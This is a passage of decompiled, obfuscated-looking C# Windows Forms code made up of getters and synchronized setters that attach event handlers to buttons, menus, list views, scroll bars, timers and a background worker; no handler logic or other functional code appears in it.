        PictureBox box = this.pictureBox_4;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_4 = pictureBox_7;
        box = this.pictureBox_4;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    internal virtual PictureBox vmethod_682()
    {
        return this.pictureBox_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_683(PictureBox pictureBox_7)
    {
        EventHandler handler = new EventHandler(this.method_221);
        PictureBox box = this.pictureBox_5;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_5 = pictureBox_7;
        box = this.pictureBox_5;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    internal virtual CheckBox vmethod_684()
    {
        return this.checkBox_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_685(CheckBox checkBox_8)
    {
        this.checkBox_6 = checkBox_8;
    }

    internal virtual VisualButton vmethod_686()
    {
        return this.visualButton_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_687(VisualButton visualButton_24)
    {
        EventHandler handler = new EventHandler(this.method_222);
        VisualButton button = this.visualButton_3;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_3 = visualButton_24;
        button = this.visualButton_3;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual VisualScrollBar vmethod_688()
    {
        return this.visualScrollBar_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_689(VisualScrollBar visualScrollBar_3)
    {
        ScrollEventHandler handler = new ScrollEventHandler(this.method_223);
        KeyEventHandler handler2 = new KeyEventHandler(this.method_254);
        VisualScrollBar bar = this.visualScrollBar_0;
        if (bar != null)
        {
            bar.Scroll -= handler;
            bar.KeyDown -= handler2;
        }
        this.visualScrollBar_0 = visualScrollBar_3;
        bar = this.visualScrollBar_0;
        if (bar != null)
        {
            bar.Scroll += handler;
            bar.KeyDown += handler2;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_69(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_39);
        ToolStripMenuItem item = this.toolStripMenuItem_20;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_20 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_20;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_690()
    {
        return this.toolStripSeparator_35;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_691(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_35 = toolStripSeparator_39;
    }

    internal virtual VisualButton vmethod_692()
    {
        return this.visualButton_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_693(VisualButton visualButton_24)
    {
        EventHandler handler = new EventHandler(this.method_225);
        VisualButton button = this.visualButton_4;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_4 = visualButton_24;
        button = this.visualButton_4;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual VisualButton vmethod_694()
    {
        return this.visualButton_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_695(VisualButton visualButton_24)
    {
        EventHandler handler = new EventHandler(this.method_226);
        VisualButton button = this.visualButton_5;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_5 = visualButton_24;
        button = this.visualButton_5;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual VisualButton vmethod_696()
    {
        return this.visualButton_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_697(VisualButton visualButton_24)
    {
        EventHandler handler = new EventHandler(this.method_227);
        VisualButton button = this.visualButton_6;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_6 = visualButton_24;
        button = this.visualButton_6;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual VisualButton vmethod_698()
    {
        return this.visualButton_7;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_699(VisualButton visualButton_24)
    {
        EventHandler handler = new EventHandler(this.method_229);
        VisualButton button = this.visualButton_7;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_7 = visualButton_24;
        button = this.visualButton_7;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_7(ContextMenuStrip contextMenuStrip_14)
    {
        this.contextMenuStrip_0 = contextMenuStrip_14;
    }

    internal virtual TabPage vmethod_70()
    {
        return this.tabPage_3;
    }

    internal virtual VisualButton vmethod_700()
    {
        return this.visualButton_8;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_701(VisualButton visualButton_24)
    {
        EventHandler handler = new EventHandler(this.method_230);
        VisualButton button = this.visualButton_8;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_8 = visualButton_24;
        button = this.visualButton_8;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual VisualButton vmethod_702()
    {
        return this.visualButton_9;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_703(VisualButton visualButton_24)
    {
        EventHandler handler = new EventHandler(this.method_232);
        VisualButton button = this.visualButton_9;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_9 = visualButton_24;
        button = this.visualButton_9;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual VisualButton vmethod_704()
    {
        return this.visualButton_10;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_705(VisualButton visualButton_24)
    {
        EventHandler handler = new EventHandler(this.method_233);
        VisualButton button = this.visualButton_10;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_10 = visualButton_24;
        button = this.visualButton_10;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual VisualButton vmethod_706()
    {
        return this.visualButton_11;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_707(VisualButton visualButton_24)
    {
        EventHandler handler = new EventHandler(this.method_234);
        VisualButton button = this.visualButton_11;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_11 = visualButton_24;
        button = this.visualButton_11;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual VisualButton vmethod_708()
    {
        return this.visualButton_12;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_709(VisualButton visualButton_24)
    {
        EventHandler handler = new EventHandler(this.method_235);
        VisualButton button = this.visualButton_12;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_12 = visualButton_24;
        button = this.visualButton_12;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_71(TabPage tabPage_17)
    {
        this.tabPage_3 = tabPage_17;
    }

    internal virtual VisualButton vmethod_710()
    {
        return this.visualButton_13;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_711(VisualButton visualButton_24)
    {
        EventHandler handler = new EventHandler(this.method_236);
        VisualButton button = this.visualButton_13;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_13 = visualButton_24;
        button = this.visualButton_13;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual VisualButton vmethod_712()
    {
        return this.visualButton_14;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_713(VisualButton visualButton_24)
    {
        EventHandler handler = new EventHandler(this.method_237);
        VisualButton button = this.visualButton_14;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_14 = visualButton_24;
        button = this.visualButton_14;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual VisualScrollBar vmethod_714()
    {
        return this.visualScrollBar_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_715(VisualScrollBar visualScrollBar_3)
    {
        ScrollEventHandler handler = new ScrollEventHandler(this.method_238);
        KeyEventHandler handler2 = new KeyEventHandler(this.method_260);
        VisualScrollBar bar = this.visualScrollBar_1;
        if (bar != null)
        {
            bar.Scroll -= handler;
            bar.KeyDown -= handler2;
        }
        this.visualScrollBar_1 = visualScrollBar_3;
        bar = this.visualScrollBar_1;
        if (bar != null)
        {
            bar.Scroll += handler;
            bar.KeyDown += handler2;
        }
    }

    internal virtual VisualScrollBar vmethod_716()
    {
        return this.visualScrollBar_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_717(VisualScrollBar visualScrollBar_3)
    {
        ScrollEventHandler handler = new ScrollEventHandler(this.method_240);
        KeyEventHandler handler2 = new KeyEventHandler(this.method_265);
        VisualScrollBar bar = this.visualScrollBar_2;
        if (bar != null)
        {
            bar.Scroll -= handler;
            bar.KeyDown -= handler2;
        }
        this.visualScrollBar_2 = visualScrollBar_3;
        bar = this.visualScrollBar_2;
        if (bar != null)
        {
            bar.Scroll += handler;
            bar.KeyDown += handler2;
        }
    }

    internal virtual GClass7 vmethod_718()
    {
        return this.gclass7_9;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_719(GClass7 gclass7_13)
    {
        MouseEventHandler handler = new MouseEventHandler(this.method_125);
        KeyEventHandler handler2 = new KeyEventHandler(this.method_132);
        ColumnClickEventHandler handler3 = new ColumnClickEventHandler(this.method_187);
        GClass7 class2 = this.gclass7_9;
        if (class2 != null)
        {
            class2.MouseUp -= handler;
            class2.KeyDown -= handler2;
            class2.ColumnClick -= handler3;
        }
        this.gclass7_9 = gclass7_13;
        class2 = this.gclass7_9;
        if (class2 != null)
        {
            class2.MouseUp += handler;
            class2.KeyDown += handler2;
            class2.ColumnClick += handler3;
        }
    }

    internal virtual ContextMenuStrip vmethod_72()
    {
        return this.contextMenuStrip_2;
    }

    internal virtual GClass7 vmethod_720()
    {
        return this.gclass7_10;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_721(GClass7 gclass7_13)
    {
        ListViewItemSelectionChangedEventHandler handler = new ListViewItemSelectionChangedEventHandler(this.method_84);
        MouseEventHandler handler2 = new MouseEventHandler(this.method_126);
        KeyEventHandler handler3 = new KeyEventHandler(this.method_134);
        EventHandler handler4 = new EventHandler(this.method_244);
        EventHandler handler5 = new EventHandler(this.method_267);
        GClass7 class2 = this.gclass7_10;
        if (class2 != null)
        {
            class2.ItemSelectionChanged -= handler;
            class2.MouseUp -= handler2;
            class2.KeyDown -= handler3;
            class2.SelectedIndexChanged -= handler4;
            class2.DoubleClick -= handler5;
        }
        this.gclass7_10 = gclass7_13;
        class2 = this.gclass7_10;
        if (class2 != null)
        {
            class2.ItemSelectionChanged += handler;
            class2.MouseUp += handler2;
            class2.KeyDown += handler3;
            class2.SelectedIndexChanged += handler4;
            class2.DoubleClick += handler5;
        }
    }

    internal virtual TabPage vmethod_722()
    {
        return this.tabPage_15;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_723(TabPage tabPage_17)
    {
        this.tabPage_15 = tabPage_17;
    }

    internal virtual Button vmethod_724()
    {
        return this.button_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_725(Button button_9)
    {
        EventHandler handler = new EventHandler(this.method_258);
        Button button = this.button_5;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.button_5 = button_9;
        button = this.button_5;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual Button vmethod_726()
    {
        return this.button_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_727(Button button_9)
    {
        EventHandler handler = new EventHandler(this.method_257);
        Button button = this.button_6;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.button_6 = button_9;
        button = this.button_6;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual Button vmethod_728()
    {
        return this.button_7;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_729(Button button_9)
    {
        EventHandler handler = new EventHandler(this.method_256);
        Button button = this.button_7;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.button_7 = button_9;
        button = this.button_7;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_73(ContextMenuStrip contextMenuStrip_14)
    {
        this.contextMenuStrip_2 = contextMenuStrip_14;
    }

    internal virtual Button vmethod_730()
    {
        return this.button_8;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_731(Button button_9)
    {
        EventHandler handler = new EventHandler(this.method_255);
        Button button = this.button_8;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.button_8 = button_9;
        button = this.button_8;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual StatusStrip vmethod_732()
    {
        return this.statusStrip_10;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_733(StatusStrip statusStrip_11)
    {
        this.statusStrip_10 = statusStrip_11;
    }

    internal virtual ToolStripStatusLabel vmethod_734()
    {
        return this.toolStripStatusLabel_36;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_735(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_36 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripStatusLabel vmethod_736()
    {
        return this.toolStripStatusLabel_37;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_737(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_37 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripStatusLabel vmethod_738()
    {
        return this.toolStripStatusLabel_38;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_739(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_38 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripMenuItem vmethod_74()
    {
        return this.toolStripMenuItem_21;
    }

    internal virtual ToolStripStatusLabel vmethod_740()
    {
        return this.toolStripStatusLabel_39;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_741(ToolStripStatusLabel toolStripStatusLabel_40)
    {
        this.toolStripStatusLabel_39 = toolStripStatusLabel_40;
    }

    internal virtual ToolStripProgressBar vmethod_742()
    {
        return this.toolStripProgressBar_7;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_743(ToolStripProgressBar toolStripProgressBar_8)
    {
        this.toolStripProgressBar_7 = toolStripProgressBar_8;
    }

    internal virtual VisualButton vmethod_744()
    {
        return this.visualButton_15;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_745(VisualButton visualButton_24)
    {
        EventHandler handler = new EventHandler(this.method_246);
        VisualButton button = this.visualButton_15;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_15 = visualButton_24;
        button = this.visualButton_15;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual ComboBox vmethod_746()
    {
        return this.comboBox_8;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_747(ComboBox comboBox_9)
    {
        EventHandler handler = new EventHandler(this.method_249);
        DrawItemEventHandler handler2 = new DrawItemEventHandler(this.method_268);
        MeasureItemEventHandler handler3 = new MeasureItemEventHandler(this.method_289);
        ComboBox box = this.comboBox_8;
        if (box != null)
        {
            box.SelectedIndexChanged -= handler;
            box.DrawItem -= handler2;
            box.MeasureItem -= handler3;
        }
        this.comboBox_8 = comboBox_9;
        box = this.comboBox_8;
        if (box != null)
        {
            box.SelectedIndexChanged += handler;
            box.DrawItem += handler2;
            box.MeasureItem += handler3;
        }
    }

    internal virtual GClass7 vmethod_748()
    {
        return this.gclass7_11;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_749(GClass7 gclass7_13)
    {
        EventHandler handler = new EventHandler(this.method_252);
        EventHandler handler2 = new EventHandler(this.method_290);
        EventHandler handler3 = new EventHandler(this.method_291);
        MouseEventHandler handler4 = new MouseEventHandler(this.method_293);
        GClass7 class2 = this.gclass7_11;
        if (class2 != null)
        {
            class2.SelectedIndexChanged -= handler;
            class2.LostFocus -= handler2;
            class2.DoubleClick -= handler3;
            class2.MouseUp -= handler4;
        }
        this.gclass7_11 = gclass7_13;
        class2 = this.gclass7_11;
        if (class2 != null)
        {
            class2.SelectedIndexChanged += handler;
            class2.LostFocus += handler2;
            class2.DoubleClick += handler3;
            class2.MouseUp += handler4;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_75(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_29);
        ToolStripMenuItem item = this.toolStripMenuItem_21;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_21 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_21;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual GClass7 vmethod_750()
    {
        return this.gclass7_12;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_751(GClass7 gclass7_13)
    {
        EventHandler handler = new EventHandler(this.method_259);
        EventHandler handler2 = new EventHandler(this.method_292);
        MouseEventHandler handler3 = new MouseEventHandler(this.method_294);
        GClass7 class2 = this.gclass7_12;
        if (class2 != null)
        {
            class2.SelectedIndexChanged -= handler;
            class2.DoubleClick -= handler2;
            class2.MouseUp -= handler3;
        }
        this.gclass7_12 = gclass7_13;
        class2 = this.gclass7_12;
        if (class2 != null)
        {
            class2.SelectedIndexChanged += handler;
            class2.DoubleClick += handler2;
            class2.MouseUp += handler3;
        }
    }

    internal virtual ZeroitAnidasoCircleProgress vmethod_752()
    {
        return this.zeroitAnidasoCircleProgress_7;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_753(ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_8)
    {
        this.zeroitAnidasoCircleProgress_7 = zeroitAnidasoCircleProgress_8;
    }

    internal virtual ZeroitProgressIndicator vmethod_754()
    {
        return this.zeroitProgressIndicator_8;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_755(ZeroitProgressIndicator zeroitProgressIndicator_9)
    {
        this.zeroitProgressIndicator_8 = zeroitProgressIndicator_9;
    }

    internal virtual ToolStripMenuItem vmethod_756()
    {
        return this.toolStripMenuItem_129;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_757(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_248);
        ToolStripMenuItem item = this.toolStripMenuItem_129;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_129 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_129;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ContextMenuStrip vmethod_758()
    {
        return this.contextMenuStrip_12;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_759(ContextMenuStrip contextMenuStrip_14)
    {
        this.contextMenuStrip_12 = contextMenuStrip_14;
    }

    internal virtual GClass7 vmethod_76()
    {
        return this.gclass7_0;
    }

    internal virtual ToolStripMenuItem vmethod_760()
    {
        return this.toolStripMenuItem_130;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_761(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_261);
        ToolStripMenuItem item = this.toolStripMenuItem_130;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_130 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_130;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_762()
    {
        return this.toolStripSeparator_36;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_763(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_36 = toolStripSeparator_39;
    }

    internal virtual ToolStripMenuItem vmethod_764()
    {
        return this.toolStripMenuItem_131;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_765(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_262);
        ToolStripMenuItem item = this.toolStripMenuItem_131;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_131 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_131;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ContextMenuStrip vmethod_766()
    {
        return this.contextMenuStrip_13;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_767(ContextMenuStrip contextMenuStrip_14)
    {
        this.contextMenuStrip_13 = contextMenuStrip_14;
    }

    internal virtual ToolStripMenuItem vmethod_768()
    {
        return this.toolStripMenuItem_132;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_769(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_263);
        ToolStripMenuItem item = this.toolStripMenuItem_132;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_132 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_132;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_77(GClass7 gclass7_13)
    {
        ListViewItemSelectionChangedEventHandler handler = new ListViewItemSelectionChangedEventHandler(this.method_69);
        EventHandler handler2 = new EventHandler(this.method_127);
        KeyEventHandler handler3 = new KeyEventHandler(this.method_138);
        EventHandler handler4 = new EventHandler(this.method_266);
        EventHandler handler5 = new EventHandler(this.method_295);
        GClass7 class2 = this.gclass7_0;
        if (class2 != null)
        {
            class2.ItemSelectionChanged -= handler;
            class2.SelectedIndexChanged -= handler2;
            class2.KeyDown -= handler3;
            class2.LostFocus -= handler4;
            class2.DoubleClick -= handler5;
        }
        this.gclass7_0 = gclass7_13;
        class2 = this.gclass7_0;
        if (class2 != null)
        {
            class2.ItemSelectionChanged += handler;
            class2.SelectedIndexChanged += handler2;
            class2.KeyDown += handler3;
            class2.LostFocus += handler4;
            class2.DoubleClick += handler5;
        }
    }

    internal virtual ToolStripSeparator vmethod_770()
    {
        return this.toolStripSeparator_37;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_771(ToolStripSeparator toolStripSeparator_39)
    {
        this.toolStripSeparator_37 = toolStripSeparator_39;
    }

    internal virtual ToolStripMenuItem vmethod_772()
    {
        return this.toolStripMenuItem_133;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_773(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_264);
        ToolStripMenuItem item = this.toolStripMenuItem_133;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_133 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_133;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual BackgroundWorker vmethod_774()
    {
        return this.backgroundWorker_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_775(BackgroundWorker backgroundWorker_4)
    {
        DoWorkEventHandler handler = new DoWorkEventHandler(this.method_270);
        BackgroundWorker worker = this.backgroundWorker_2;
        if (worker != null)
        {
            worker.DoWork -= handler;
        }
        this.backgroundWorker_2 = backgroundWorker_4;
        worker = this.backgroundWorker_2;
        if (worker != null)
        {
            worker.DoWork += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_776()
    {
        return this.toolStripMenuItem_134;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_777(ToolStripMenuItem toolStripMenuItem_136)
    {
        EventHandler handler = new EventHandler(this.method_271);
        ToolStripMenuItem item = this.toolStripMenuItem_134;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_134 = toolStripMenuItem_136;
        item = this.toolStripMenuItem_134;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual TabPage vmethod_778()
    {
        return this.tabPage_16;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_779(TabPage tabPage_17)
    {
        EventHandler handler = new EventHandler(this.method_287);
        TabPage page = this.tabPage_16;
        if (page != null)
        {
            page.Click -= handler;
        }
        this.tabPage_16 = tabPage_17;
        page = this.tabPage_16;
        if (page != null)
        {
            page.Click += handler;
        }
    }

    internal virtual GClass7 vmethod_78()
    {
        return this.gclass7_1;
    }

    internal virtual VisualButton vmethod_780()
    {
        return this.visualButton_16;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_781(VisualButton visualButton_24)
    {
        EventHandler handler = new EventHandler(this.method_278);
        VisualButton button = this.visualButton_16;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_16 = visualButton_24;
        button = this.visualButton_16;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual VisualButton vmethod_782()
    {
        return this.visualButton_17;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_783(VisualButton visualButton_24)
    {
        EventHandler handler = new EventHandler(this.method_275);
        VisualButton button = this.visualButton_17;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_17 = visualButton_24;
        button = this.visualButton_17;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual TextBox vmethod_784()
    {
        return this.textBox_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_785(TextBox textBox_2)
    {
        EventHandler handler = new EventHandler(this.method_276);
        TextBox box = this.textBox_0;
        if (box != null)
        {
            box.TextChanged -= handler;
        }
        this.textBox_0 = textBox_2;
        box = this.textBox_0;
        if (box != null)
        {
            box.TextChanged += handler;
        }
    }

    internal virtual Label vmethod_786()
    {
        return this.label_26;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_787(Label label_30)
    {
        this.label_26 = label_30;
    }

    internal virtual TextBox vmethod_788()
    {
        return this.textBox_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_789(TextBox textBox_2)
    {
        this.textBox_1 = textBox_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_79(GClass7 gclass7_13)
    {
        KeyEventHandler handler = new KeyEventHandler(this.method_133);
        MouseEventHandler handler2 = new MouseEventHandler(this.method_224);
        ColumnClickEventHandler handler3 = new ColumnClickEventHandler(this.method_243);
        GClass7 class2 = this.gclass7_1;
        if (class2 != null)
        {
            class2.KeyDown -= handler;
            class2.MouseUp -= handler2;
            class2.ColumnClick -= handler3;
        }
        this.gclass7_1 = gclass7_13;
        class2 = this.gclass7_1;
        if (class2 != null)
        {
            class2.KeyDown += handler;
            class2.MouseUp += handler2;
            class2.ColumnClick += handler3;
        }
    }

    internal virtual Label vmethod_790()
    {
        return this.label_27;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_791(Label label_30)
    {
        this.label_27 = label_30;
    }

    internal virtual Timer vmethod_792()
    {
        return this.timer_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_793(Timer timer_4)
    {
        EventHandler handler = new EventHandler(this.method_277);
        Timer timer = this.timer_3;
        if (timer != null)
        {
            timer.Tick -= handler;
        }
        this.timer_3 = timer_4;
        timer = this.timer_3;
        if (timer != null)
        {
            timer.Tick += handler;
        }
    }

    internal virtual Label vmethod_794()
    {
        return this.label_28;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_795(Label label_30)
    {
        this.label_28 = label_30;
    }

    internal virtual VisualButton vmethod_796()
    {
        return this.visualButton_18;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_797(VisualButton visualButton_24)
    {
        EventHandler handler = new EventHandler(this.method_284);
        VisualButton button = this.visualButton_18;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_18 = visualButton_24;
        button = this.visualButton_18;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual VisualButton vmethod_798()
    {
        return this.visualButton_19;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_799(VisualButton visualButton_24)
    {
        EventHandler handler = new EventHandler(this.method_281);
        VisualButton button = this.visualButton_19;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_19 = visualButton_24;
        button = this.visualButton_19;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_8()
    {
        return this.toolStripMenuItem_2;
    }

    internal virtual Label vmethod_80()
    {
        return this.label_1;
    }

    internal virtual VisualButton vmethod_800()
    {
        return this.visualButton_20;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_801(VisualButton visualButton_24)
    {
        EventHandler handler = new EventHandler(this.method_283);
        VisualButton button = this.visualButton_20;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_20 = visualButton_24;
        button = this.visualButton_20;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual VisualButton vmethod_802()
    {
        return this.visualButton_21;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_803(VisualButton visualButton_24)
    {
        EventHandler handler = new EventHandler(this.method_282);
        VisualButton button = this.visualButton_21;
        if (button != null)
        {
            button.Click -= handler;
        }
